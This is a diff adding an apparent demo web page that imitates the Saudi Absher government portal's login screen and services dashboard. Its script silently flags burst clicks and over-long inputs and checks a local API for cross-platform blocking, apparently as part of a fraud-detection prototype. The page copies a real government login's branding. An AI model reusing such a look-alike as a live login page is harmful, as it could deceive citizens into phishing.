@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أبشر - تسجيل الدخول</title>
+    <script src="../js/events.js" defer></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Arial', 'Tahoma', sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        /* Header Section */
+        .top-header {
+            background: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 10px 50px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            font-family: 'Segoe UI', 'Arial', 'Tahoma', sans-serif;
+            position: relative;
+            z-index: 1000;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+        
+        .vision-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .vision-logo-img {
+            height: 48px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+        
+        .header-link {
+            color: #333333;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: color 0.2s;
+            white-space: nowrap;
+            letter-spacing: 0.1px;
+        }
+        
+        .header-link:hover {
+            color: #006b5c;
+        }
+        
+        .header-link .icon {
+            font-size: 15px;
+            color: #666666;
+        }
+        
+        .search-link {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .lang-link {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            position: relative;
+        }
+        
+        .lang-link::after {
+            content: '▼';
+            font-size: 8px;
+            margin-right: 4px;
+            color: #666666;
+            margin-top: 1px;
+        }
+        
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 22px;
+            margin-right: 8px;
+        }
+        
+        .nav-link {
+            color: #333333;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            position: relative;
+            white-space: nowrap;
+            transition: color 0.2s;
+            letter-spacing: 0.1px;
+        }
+        
+        .nav-link:hover {
+            color: #006b5c;
+        }
+        
+        .nav-link.with-dropdown {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .nav-link.with-dropdown::before {
+            content: '↗';
+            font-size: 13px;
+            margin-left: 4px;
+            color: #666666;
+            font-weight: normal;
+        }
+        
+        .nav-link.with-dropdown::after {
+            content: '▼';
+            font-size: 8px;
+            margin-right: 4px;
+            color: #666666;
+            margin-top: 1px;
+        }
+        
+        .nav-link.with-icon {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .absher-logo-img {
+            height: 32px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        /* Main Content */
+        .main-container {
+            display: flex;
+            min-height: calc(100vh - 70px);
+        }
+        
+        .login-section {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            background: #fafafa;
+        }
+        
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .login-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 30px;
+            text-align: right;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        
+        .input-wrapper {
+            position: relative;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px 45px 15px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            text-align: right;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #006b5c;
+            box-shadow: 0 0 0 3px rgba(0, 166, 155, 0.1);
+        }
+        
+        .form-group input::placeholder {
+            color: #999;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            color: #999;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+        
+        .password-toggle:hover {
+            color: #006b5c;
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #006b5c;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 15px;
+            background: #006b5c;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        
+        .login-button:hover {
+            background: #00897b;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0, 166, 155, 0.3);
+        }
+        
+        .login-button:active {
+            transform: translateY(0);
+        }
+        
+        .login-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .new-user-link {
+            text-align: center;
+        }
+        
+        .new-user-link a {
+            color: #006b5c;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .new-user-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            padding: 10px;
+            background: #fee;
+            border-radius: 6px;
+            border: 1px solid #e74c3c;
+            text-align: right;
+        }
+        
+        .blocked-message {
+            color: #c0392b;
+            font-size: 16px;
+            margin-top: 15px;
+            display: none;
+            padding: 15px;
+            background: #fee;
+            border-radius: 8px;
+            border: 2px solid #c0392b;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .blocked-message.show {
+            display: block;
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .blocked-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        /* Services Screen */
+        .services-screen {
+            display: none;
+            width: 100%;
+            background: #fafafa;
+            min-height: 100vh;
+            position: relative;
+        }
+        
+        .services-screen.active {
+            display: block;
+        }
+        
+        .services-header {
+            background: white;
+            padding: 20px 50px;
+            border-bottom: 1px solid #e0e0e0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            z-index: 100;
+        }
+        
+        .services-header h1 {
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+            flex: 1;
+        }
+        
+        .services-header a {
+            color: #006b5c;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .services-header a:hover {
+            color: #00897b;
+        }
+        
+        .services-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        .info-dashboard {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            margin-bottom: 30px;
+        }
+        
+        .info-dashboard h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .info-card {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            border-right: 4px solid #006b5c;
+            text-align: right;
+        }
+        
+        .info-card h3 {
+            color: #006b5c;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        .info-card p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .services-section-title {
+            margin: 30px 0 10px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            text-align: right;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .services-section-title span {
+            font-size: 20px;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 18px;
+            margin-top: 10px;
+        }
+
+        .service-card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+            padding: 18px 18px 16px;
+            text-align: right;
+            border-top: 3px solid #006b5c;
+            transition: transform 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .service-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+        }
+
+        .service-name {
+            font-size: 16px;
+            font-weight: 600;
+            color: #006b5c;
+            margin-bottom: 6px;
+        }
+
+        .service-meta {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+
+        .service-desc {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 14px;
+            line-height: 1.5;
+        }
+
+        .service-btn {
+            width: 100%;
+            padding: 9px 16px;
+            background: #006b5c;
+            color: #fff;
+            border-radius: 6px;
+            border: none;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.15s ease, transform 0.08s ease;
+        }
+
+        .service-btn:hover {
+            background: #00897b;
+        }
+
+        .service-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .dashboard-link {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 12px 24px;
+            background: #006b5c;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+        
+        .dashboard-link:hover {
+            background: #00897b;
+            transform: translateY(-2px);
+        }
+        
+        @media (max-width: 768px) {
+            .top-header {
+                flex-direction: column;
+                gap: 15px;
+                padding: 15px;
+            }
+            
+            .header-right {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .login-container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="top-header">
+        <div class="header-left">
+            <div class="vision-logo">
+                <img src="/image/moi-2030-logos.png" alt="Vision 2030" class="vision-logo-img" />
+            </div>
+        </div>
+        
+        <div class="header-right">
+            <a href="#" class="header-link search-link">
+                <span class="icon">🔍</span>
+                <span>ابحث</span>
+            </a>
+            
+            <a href="#" class="header-link lang-link">
+                <span class="icon">🌐</span>
+                <span>English</span>
+            </a>
+            
+            <div class="nav-links">
+                <a href="#" class="nav-link with-dropdown">منصات أبشر الأخرى</a>
+                <a href="#" class="nav-link">دليل الخدمات</a>
+                <a href="#" class="nav-link">المشاركة الالكترونية</a>
+                <a href="#" class="nav-link">عن أبشر</a>
+                <a href="#" class="nav-link with-icon">
+                    <span>الرئيسية</span>
+                    <img src="/image/absher_logo.svg" alt="أبشر" class="absher-logo-img" />
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Login Screen -->
+    <div class="main-container" id="loginScreen">
+        <div class="login-section">
+            <div class="login-container">
+                <h1 class="login-title">تسجيل الدخول</h1>
+                
+                <form class="login-form" onsubmit="handleLogin(event)">
+                    <div class="form-group">
+                        <label for="username">اسم المستخدم أو رقم الهوية</label>
+                        <div class="input-wrapper">
+                            <input 
+                                type="text" 
+                                id="username" 
+                                name="username" 
+                                placeholder="اسم المستخدم أو رقم الهوية"
+                                required
+                                maxlength="10"
+                            >
+                            <span class="input-icon">👤</span>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">كلمة المرور</label>
+                        <div class="input-wrapper">
+                            <input 
+                                type="password" 
+                                id="password" 
+                                name="password" 
+                                placeholder="كلمة المرور"
+                                required
+                            >
+                            <button type="button" class="password-toggle" onclick="togglePassword()">
+                                👁️
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="forgot-password">
+                        <a href="#">نسيت كلمة المرور؟</a>
+                    </div>
+                    
+                    <div class="error-message" id="errorMessage">
+                        اسم المستخدم أو كلمة المرور غير صحيحة
+                    </div>
+                    
+                    <div class="blocked-message" id="blockedMessage">
+                        <span class="blocked-icon">🚫</span>
+                        <strong>تم حجب دخولك مؤقتاً</strong>
+                        <p style="margin-top: 10px; font-size: 14px;">
+                            بسبب سلوك مشبوه تم رصده على منصة حكومية أخرى
+                        </p>
+                    </div>
+                    
+                    <button type="submit" class="login-button" id="loginButton">
+                        تسجيل الدخول
+                    </button>
+                </form>
+                
+                <div class="new-user-link">
+                    <a href="#">مستخدم جديد؟</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Services Screen -->
+    <div class="services-screen" id="servicesScreen" style="display: none;">
+        <div class="services-header">
+            <h1>لوحة المعلومات - أبشر</h1>
+            <a href="hub.html">← العودة للصفحة الرئيسية</a>
+        </div>
+        
+        <div class="services-container">
+            <div class="info-dashboard">
+                <h2>مرحباً بك في أبشر</h2>
+                
+                <div class="info-grid">
+                    <div class="info-card">
+                        <h3>🆔 الهوية الرقمية</h3>
+                        <p>عرض هويتك الرقمية</p>
+                    </div>
+                    
+                    <div class="info-card">
+                        <h3>📋 الخدمات الإلكترونية</h3>
+                        <p>الوصول إلى جميع الخدمات</p>
+                    </div>
+                    
+                    <div class="info-card">
+                        <h3>🔒 الأمان والحماية</h3>
+                        <p>حماية بياناتك الشخصية</p>
+                    </div>
+                </div>
+            </div>
+            
+            <h2 class="services-section-title">
+                <span>🚗</span>
+                خدمات المرور والمركبات
+            </h2>
+            <div class="services-grid">
+                <div class="service-card">
+                    <div class="service-name">🚗 تفويض مركبة</div>
+                    <div class="service-meta">خدمة المرور</div>
+                    <div class="service-desc">تفويض شخص آخر لقيادة مركبتك</div>
+                    <button class="service-btn" 
+                            data-track-service="vehicle_authorization"
+                            onclick="handleServiceClick('vehicle_authorization', 'تفويض مركبة')">
+                        فتح الخدمة
+                    </button>
+                </div>
+                
+                <div class="service-card">
+                    <div class="service-name">📋 المخالفات المرورية</div>
+                    <div class="service-meta">خدمة المرور</div>
+                    <div class="service-desc">عرض ودفع المخالفات المرورية</div>
+                    <button class="service-btn" 
+                            data-track-service="traffic_violations"
+                            onclick="handleServiceClick('traffic_violations', 'المخالفات المرورية')">
+                        فتح الخدمة
+                    </button>
+                </div>
+                
+                <div class="service-card">
+                    <div class="service-name">🚨 تقارير الحوادث</div>
+                    <div class="service-meta">خدمة المرور</div>
+                    <div class="service-desc">عرض تقارير الحوادث المرورية</div>
+                    <button class="service-btn" 
+                            data-track-service="accident_reports"
+                            onclick="handleServiceClick('accident_reports', 'تقارير الحوادث')">
+                        فتح الخدمة
+                    </button>
+                </div>
+            </div>
+            
+            <h2 class="services-section-title">
+                <span>👤</span>
+                الخدمات الشخصية
+            </h2>
+            <div class="services-grid">
+                <div class="service-card">
+                    <div class="service-name">🆔 الهوية الرقمية</div>
+                    <div class="service-meta">خدمة بياناتي</div>
+                    <div class="service-desc">عرض وإدارة هويتك الرقمية</div>
+                    <button class="service-btn" 
+                            data-track-service="digital_id"
+                            onclick="handleServiceClick('digital_id', 'الهوية الرقمية')">
+                        فتح الخدمة
+                    </button>
+                </div>
+                
+                <div class="service-card">
+                    <div class="service-name">📊 خدمة بياناتي</div>
+                    <div class="service-meta">البيانات الشخصية</div>
+                    <div class="service-desc">عرض وتحديث بياناتك الشخصية</div>
+                    <button class="service-btn" 
+                            data-track-service="my_data"
+                            onclick="handleServiceClick('my_data', 'خدمة بياناتي')">
+                        فتح الخدمة
+                    </button>
+                </div>
+                
+                <div class="service-card">
+                    <div class="service-name">👨‍👩‍👧‍👦 سجل الأسرة</div>
+                    <div class="service-meta">البيانات العائلية</div>
+                    <div class="service-desc">عرض سجل أفراد الأسرة</div>
+                    <button class="service-btn" 
+                            data-track-service="family_record"
+                            onclick="handleServiceClick('family_record', 'سجل الأسرة')">
+                        فتح الخدمة
+                    </button>
+                </div>
+                
+                <div class="service-card">
+                    <div class="service-name">✈️ سجل السفر</div>
+                    <div class="service-meta">السفر والجوازات</div>
+                    <div class="service-desc">عرض سجل السفر والرحلات</div>
+                    <button class="service-btn" 
+                            data-track-service="travel_record"
+                            onclick="handleServiceClick('travel_record', 'سجل السفر')">
+                        فتح الخدمة
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+    
+    <script>
+        // API_BASE is defined in events.js - don't redeclare it here
+        // Use window.API_BASE if needed, or rely on events.js
+    
+        // ============================================
+        // UI-BASED ATTACK DETECTION SYSTEM
+        // ============================================
+        
+        // (A) Burst-Click Attack Detection
+        // Array to store login click timestamps
+        const loginClickTimestamps = [];
+        const BURST_ATTACK_THRESHOLD = 3; // 3 or more clicks
+        const BURST_ATTACK_WINDOW = 5000;  // within 5 seconds (5000ms)
+        
+        /**
+         * Records a login button click timestamp and detects burst attacks
+         * @param {string} userId - The user ID attempting login
+         * @returns {boolean} - True if burst attack detected, false otherwise
+         */
+        function detectBurstClickAttack(userId) {
+            const now = Date.now();
+            
+            // Add current click timestamp
+            loginClickTimestamps.push(now);
+            
+            // Remove timestamps older than 5 seconds
+            const recentClicks = loginClickTimestamps.filter(ts => now - ts <= BURST_ATTACK_WINDOW);
+            
+            // Update array to only keep recent clicks
+            loginClickTimestamps.length = 0;
+            loginClickTimestamps.push(...recentClicks);
+            
+            // Check if burst attack detected (3+ clicks in 5 seconds)
+            if (recentClicks.length >= BURST_ATTACK_THRESHOLD) {
+                // Generate suspicious pattern event
+                sendEventToServerSafe('ui_suspicious_pattern', userId, {
+                    burst_attack: true,
+                    click_count: recentClicks.length,
+                    page: 'absher'
+                });
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // (B) Long Input Detection
+        /**
+         * Detects suspiciously long username or password inputs
+         * @param {string} username - The username input value
+         * @param {string} password - The password input value
+         * @param {string} userId - The user ID
+         * @returns {boolean} - True if long input detected, false otherwise
+         */
+        function detectLongInput(username, password, userId) {
+            const usernameLength = username ? username.length : 0;
+            const passwordLength = password ? password.length : 0;
+            
+            // Suspicious if username >= 20 OR password >= 32
+            if (usernameLength >= 20 || passwordLength >= 32) {
+                // Generate suspicious pattern event
+                sendEventToServerSafe('ui_suspicious_pattern', userId, {
+                    long_input: true,
+                    username_length: usernameLength,
+                    password_length: passwordLength,
+                    page: 'absher'
+                });
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // ============================================
+        // EXISTING FUNCTIONS (UNCHANGED)
+        // ============================================
+        
+        // زر إظهار/إخفاء كلمة المرور
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleButton = document.querySelector('.password-toggle');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleButton.textContent = '🙈';
+            } else {
+                passwordInput.type = 'password';
+                toggleButton.textContent = '👁️';
+            }
+        }
+    
+        // عند تحميل الصفحة: لو عندي user_id مخزن أشيّك إذا محجوب
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedUserId = localStorage.getItem('user_id');
+            if (savedUserId) {
+                checkIfBlocked(savedUserId);
+            }
+        });
+    
+        // Use sendEvent from events.js (centralized event tracking)
+        function sendEventToServerSafe(eventType, userId, extra = {}) {
+            try {
+                if (typeof sendEvent === "function") {
+                    // sendEvent from events.js handles user_id automatically via getCurrentUserId()
+                    sendEvent(eventType, null, extra);
+                } else {
+                    console.warn("sendEvent غير معرّفة (تحققي من events.js)");
+                }
+            } catch (e) {
+                console.error("Error sending event:", e);
+            }
+        }
+    
+        // إظهار واجهة الحجب (بدون تفاصيل تهديد)
+        function showBlockedUI() {
+            const blockedMessage = document.getElementById('blockedMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const loginButton = document.getElementById('loginButton');
+            
+            // Show blocked message UI
+            blockedMessage.classList.add('show');
+            errorMessage.style.display = 'none';
+            
+            loginButton.disabled = true;
+            loginButton.textContent = "الدخول موقوف";
+        }
+        
+        // Show blocking overlay (full-screen modal)
+        function showBlockOverlay(message) {
+            let overlay = document.getElementById('block-overlay');
+            if (!overlay) {
+                // Create overlay if it doesn't exist
+                overlay = document.createElement('div');
+                overlay.id = 'block-overlay';
+                overlay.style.cssText = `
+                    display: none;
+                    position: fixed;
+                    inset: 0;
+                    background: rgba(0, 0, 0, 0.7);
+                    align-items: center;
+                    justify-content: center;
+                    z-index: 9999;
+                `;
+                overlay.innerHTML = `
+                    <div style="background: white; padding: 40px; border-radius: 12px; max-width: 500px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
+                        <div style="font-size: 48px; margin-bottom: 20px;">🚫</div>
+                        <h3 style="color: #c92a2a; font-size: 24px; margin-bottom: 15px;">تم حجب دخولك</h3>
+                        <p id="block-message" style="color: #666; font-size: 16px; line-height: 1.6;">
+                            ${message || 'تم حجب دخولك مؤقتاً بسبب سلوك مشبوه تم رصده على منصة حكومية أخرى.'}
+                        </p>
+                        <button onclick="document.getElementById('block-overlay').style.display='none'" 
+                                style="margin-top: 25px; padding: 12px 30px; background: #006b5c; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 14px;">
+                            فهمت
+                        </button>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+            }
+            
+            const msgElement = document.getElementById('block-message');
+            if (msgElement) {
+                msgElement.textContent = message || 'تم حجب دخولك مؤقتاً بسبب سلوك مشبوه تم رصده على منصة حكومية أخرى.';
+            }
+            
+            overlay.style.display = 'flex';
+        }
+    
+        // التحقق هل المستخدم محجوب (تُستدعى عند فتح الصفحة لو كان user_id موجود)
+        async function checkIfBlocked(userId) {
+            try {
+                const response = await fetch(`${window.API_BASE || 'http://localhost:5000'}/api/v1/check-and-login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user_id: userId, precheck_only: true })
+                });
+    
+                if (response.status === 403) {
+                    // محجوب
+                    showBlockedUI();
+                    sendEventToServerSafe('check_blocked', userId);
+                }
+            } catch (error) {
+                console.error('Error checking block status:', error);
+            }
+        }
+    
+        // ============================================
+        // MODIFIED LOGIN HANDLER WITH DETECTION
+        // ============================================
+        
+        // معالجة تسجيل الدخول
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const errorMessage = document.getElementById('errorMessage');
+            const blockedMessage = document.getElementById('blockedMessage');
+            const loginButton = document.getElementById('loginButton');
+    
+            // Hide all messages initially
+            errorMessage.style.display = 'none';
+            blockedMessage.classList.remove('show');
+    
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+    
+            // Basic validation
+            if (!username || !password) {
+                errorMessage.textContent = 'يرجى إدخال اسم المستخدم وكلمة المرور.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+    
+            // Use DEMO_USER_ID from events.js (centralized)
+            const userId = getCurrentUserId ? getCurrentUserId() : `user-${username}`;
+            
+            // ============================================
+            // ATTACK DETECTION (SILENT - NO USER WARNING)
+            // ============================================
+            
+            // (A) Detect burst-click attack (if function exists)
+            if (typeof detectBurstClickAttack === 'function') {
+                detectBurstClickAttack(userId);
+            }
+            
+            // (B) Detect long input (if function exists)
+            if (typeof detectLongInput === 'function') {
+                detectLongInput(username, password, userId);
+            }
+            
+            // ============================================
+            // NORMAL LOGIN ATTEMPT EVENT (ALWAYS SENT)
+            // ============================================
+            
+            // Always send login_attempt event using centralized sendEvent
+            if (typeof sendEvent === 'function') {
+                sendEvent('login_attempt', null, { page: 'absher' });
+            } else {
+                sendEventToServerSafe('login_attempt', userId, { page: 'absher' });
+            }
+            
+            // Disable button during verification
+            loginButton.disabled = true;
+            loginButton.textContent = "جاري التحقق...";
+            
+            try {
+                const response = await fetch(`${window.API_BASE || 'http://localhost:5000'}/api/v1/check-and-login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user_id: userId })
+                });
+                
+                const result = await response.json();
+                
+                // 403 = محجوب من النظام (بسبب بصمة عالية الخطورة)
+                if (response.status === 403 || result.status === "blocked") {
+                    showBlockOverlay(result.message || "تم حجب دخولك مؤقتاً بسبب سلوك مشبوه تم رصده على منصة حكومية أخرى");
+                    if (typeof sendEvent === 'function') {
+                        sendEvent('login_blocked', null, { reason: 'high_risk_fingerprint', page: 'absher' });
+                    } else {
+                        sendEventToServerSafe('login_blocked', userId, { page: 'absher' });
+                    }
+                    return;
+                }
+                
+                if (!response.ok) {
+                    throw new Error('خطأ في الاتصال بالخادم');
+                }
+                
+                if (result.allowed) {
+                    // نجاح
+                    if (typeof sendEvent === 'function') {
+                        sendEvent('login_success', null, { page: 'absher' });
+                    } else {
+                        sendEventToServerSafe('login_success', userId, { page: 'absher' });
+                    }
+                    alert("تم تسجيل الدخول بنجاح في أبشر (demo).");
+                    showServicesScreen();
+                } else {
+                    // فشل عادي (بدون ذكر بصمات أو هجمات)
+                    errorMessage.textContent = 'اسم المستخدم أو كلمة المرور غير صحيحة.';
+                    errorMessage.style.display = 'block';
+                    if (typeof sendEvent === 'function') {
+                        sendEvent('login_failed', null, { page: 'absher' });
+                    } else {
+                        sendEventToServerSafe('login_failed', userId, { page: 'absher' });
+                    }
+                }
+    
+            } catch (error) {
+                console.error('Error during login:', error);
+                errorMessage.textContent = 'حدث خطأ أثناء الاتصال بالخادم.';
+                errorMessage.style.display = 'block';
+            } finally {
+                if (!loginButton.disabled) {
+                    loginButton.textContent = "تسجيل الدخول";
+                }
+                // لو المستخدم غير محجوب نرجع نفعّل الزر
+                if (loginButton.textContent !== "الدخول موقوف") {
+                    loginButton.disabled = false;
+                }
+            }
+        }
+    
+        // إظهار شاشة تسجيل الدخول
+        function showLoginScreen() {
+            document.getElementById('loginScreen').style.display = 'flex';
+            document.getElementById('servicesScreen').style.display = 'none';
+        }
+    
+        // إظهار شاشة الخدمات (بعد نجاح الدخول)
+        function showServicesScreen() {
+            document.getElementById('loginScreen').style.display = 'none';
+            const servicesScreen = document.getElementById('servicesScreen');
+            servicesScreen.style.display = 'block';
+            servicesScreen.classList.add('active');
+            
+            // Attach rapid click detectors to all service buttons
+            setTimeout(() => {
+                document.querySelectorAll('.service-btn[data-track-service]').forEach(btn => {
+                    if (typeof attachRapidClickDetector === 'function') {
+                        attachRapidClickDetector(btn);
+                    }
+                });
+            }, 100);
+        }
+        
+        // Handle service button clicks
+        function handleServiceClick(serviceId, serviceName) {
+            console.log(`📋 Service clicked: ${serviceName} (${serviceId})`);
+            
+            // Send event using centralized sendEvent from events.js
+            if (typeof sendEvent === 'function') {
+                sendEvent('view_service', serviceId, {
+                    service_name: serviceName,
+                    page: 'absher'
+                });
+            } else {
+                console.warn('sendEvent not available from events.js');
+            }
+            
+            // Show feedback (in demo mode, this is suppressed)
+            if (typeof DEMO_MODE === 'undefined' || !DEMO_MODE) {
+                alert(`تم فتح خدمة ${serviceName}`);
+            } else {
+                console.log(`[DEMO] Service opened: ${serviceName}`);
+            }
+        }
+    </script>
+    
+</body>
+</html>
